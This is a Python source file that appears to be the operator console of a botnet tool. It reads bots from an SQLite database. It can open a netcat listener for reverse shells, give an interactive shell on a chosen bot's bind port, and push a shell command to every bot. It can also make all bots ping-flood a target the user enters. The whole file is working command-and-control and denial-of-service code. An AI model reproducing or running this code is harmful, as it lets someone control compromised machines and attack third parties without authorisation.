from termcolor import cprint
import sqlite3
from os import system
import socket
import threading
import time
import os

def listbot(tabl):
    cprint("List of all the bots: ", attrs=["bold"])
    conn=sqlite3.connect('bnmanager.sqlite')
    cursor=conn.execute("SELECT ID, Pay_name, host, port FROM "+tabl)
    
    print("{:<{id_width}} {:<{name_width}} {:<{host_width}} {:<{port_width}}".format("ID", "Name", "Host", "Port", id_width=2, name_width=10, host_width=15, port_width=6))
    print("-" * (2 + 10 + 15 + 6)) 

    for bot in cursor:
        print("{:<{id_width}} {:<{name_width}} {:<{host_width}} {:<{port_width}}".format(*bot, id_width=2, name_width=10, host_width=15, port_width=6))


def rev():
    try:
        listbot("reverse")
        cprint("\nEnter Bot index of which you want to spawn reverse shell of\n",attrs=["bold"])
        cprint("reverse> ", "green" ,attrs=["bold"], end="")
        
        user_input=input()
        if not user_input.isdigit():
            cprint("Invalid input. Please enter a valid bot index.", "yellow")
            return 1
        conn=sqlite3.connect('bnmanager.sqlite')
        query="SELECT ID, host, port, pay_name FROM reverse WHERE ID="+str(user_input)
        cursor=conn.execute(query)
        lcursor=list(cursor)
        
        if len(lcursor) == 0:
            cprint("Invalid Choice. Exiting...", "yellow")
            return 1
        
        port = lcursor[0][2]
        command = f"nc -lnvp {port}"
        try:
            os.system(command)
        except KeyboardInterrupt:
            cprint("\n[+] Ctrl+C detected. Exiting reverse shell...", "yellow", attrs=["bold"])
            return 0
        
    except KeyboardInterrupt as e:
        cprint("Exiting Bot operation mode...", "yellow")
        return 1 
    finally:
        conn.close()

def single():
    """
    select a bot
    
    """
    try:
        listbot("bind")
        cprint("\nEnter Bot index which you want to take control of\n",attrs=["bold"])
        cprint("single> ", "green" ,attrs=["bold"], end="")
        
        user_input=input()
        if not user_input.isdigit():
            cprint("Invalid input. Please enter a valid bot index.", "yellow")
            return 1
        
        conn=sqlite3.connect('bnmanager.sqlite')
        query="SELECT ID, host, port, pay_name FROM bind WHERE ID="+str(user_input)
        cursor=conn.execute(query)
        lcursor=list(cursor)
        
        if len(lcursor) == 0:
            cprint("Invalid Choice. Exiting...", "yellow")
            return 1
        
        ip = lcursor[0][1]
        port = lcursor[0][2]
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print()
        try:
            sock.connect((ip, port))
            cprint("[+] Connected to " + lcursor[0][3] + ". BNShell spawned.", "cyan", attrs=["bold"])
            print()
            while True:
                cprint("BNShell/" + lcursor[0][3] + "> ", "blue", attrs=["bold"], end="")
                user_input = input()
                sock.send(user_input.encode())
                response = sock.recv(1024).decode()
                print(response,end="")
        except KeyboardInterrupt:
            cprint("\n[+] Ctrl+C detected. Exiting BNShell...", "yellow", attrs=["bold"])
            sock.close()
            return 0
        except:
            cprint("[+] Connection to " + lcursor[0][3] + " failed", "red", attrs=["bold"])
            time.sleep(1)
            cprint("[+] Exiting bot operate module...", "yellow", attrs=["bold"])
            time.sleep(0.5)
            return 1
    except KeyboardInterrupt as e:
        cprint("Exiting Bot operation mode...", "yellow")
        return 1

def ddos():
    def ping_google(ip, sock):
        while not exit_flag:
            try:        
                command="for i in {1..10}; do (ping -c 10 -i 0.2 "+target+" &) > /dev/null 2>&1; done"
                sock.sendall(command.encode()) 
            except Exception as e:
                cprint("[+] Error while pinging "+bot_detail, "red",attrs=["bold"])
            time.sleep(1)
            cprint("[+] Sent 100 ping flood using "+bot_detail,"cyan",attrs=["bold"])

    def connect_and_ping(ip, port):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            cprint("[+] Connected to "+bot_detail+"Initiating DoS.","green",attrs=["bold"])
            threading.Thread(target=ping_google, args=(ip, sock), daemon=True).start() 
            return sock
        except Exception as e:
            cprint("[+] Connection to "+bot_detail+ "failed.", "red",attrs=["bold"])
            return None

    def close_sockets(sockets):
        for sock in sockets:
            sock.close()

    cprint("DDoS>","green",attrs=["bold"], end=" ")
    cprint("Enter your target", attrs=["bold"])
    cprint("DDoS>","green",attrs=["bold"], end=" ")
    try:
        target=input()
    except KeyboardInterrupt:
        cprint("Exiting 'Bot operation' mode...", "yellow")
        return 1

    conn=sqlite3.connect('bnmanager.sqlite')
    query="SELECT ID, host, port, pay_name FROM bind"
    cursor=conn.execute(query)
    ip_ports =list(cursor)
    exit_flag=False
    try:
        sockets = []

        for id, ip, port, pay_name in ip_ports:
            bot_detail=pay_name+" ("+ip+":"+str(port)+")"
            sock = connect_and_ping(ip, port)
            if sock:
                sockets.append(sock)

        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        cprint("\n[+] Ctrl+C detected. Stopping the Attack...", "yellow",attrs=["bold"])
        exit_flag=True
        close_sockets(sockets)
        

def all():
    def connect_host(ip,port):
        try:
            cprint("[+] Trying to connect "+bot_detail,"blue",attrs=["bold"])
            time.sleep(0.5)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            cprint("[+] Connected to "+bot_detail+". Executing Command.","green",attrs=["bold"])
            try:
                modified_command=command+" && echo bnmanager9110"
                sock.send(modified_command.encode())    
                
            except:
                cprint("[+] Failed to execute on "+bot_detail+".", "red",attrs=["bold"])
            time.sleep(1)
            sock.close()
            cprint("[+] Closing the "+bot_detail+" connection.", "green",attrs=["bold"])
        except Exception as e:
            cprint("[+] Failed to connect on "+bot_detail+".", "red",attrs=["bold"])
            time.sleep(1)
        

    cprint("DDoS>","green",attrs=["bold"], end=" ")
    cprint("Enter the command you want to run", attrs=["bold"])
    cprint("DDoS>","green",attrs=["bold"], end=" ")
    try:
        command=input()
        conn=sqlite3.connect('bnmanager.sqlite')
        query="SELECT ID, host, port, pay_name FROM bind"
        cursor=conn.execute(query)
        ip_ports =list(cursor)
        
        
        for id, ip, port, pay_name in ip_ports:
            bot_detail=pay_name+" ("+ip+":"+str(port)+")"
            connect_host(ip, port)
    except KeyboardInterrupt:
        cprint("Exiting 'Bot operation' mode...", "yellow",attrs=["bold"])
        return 1

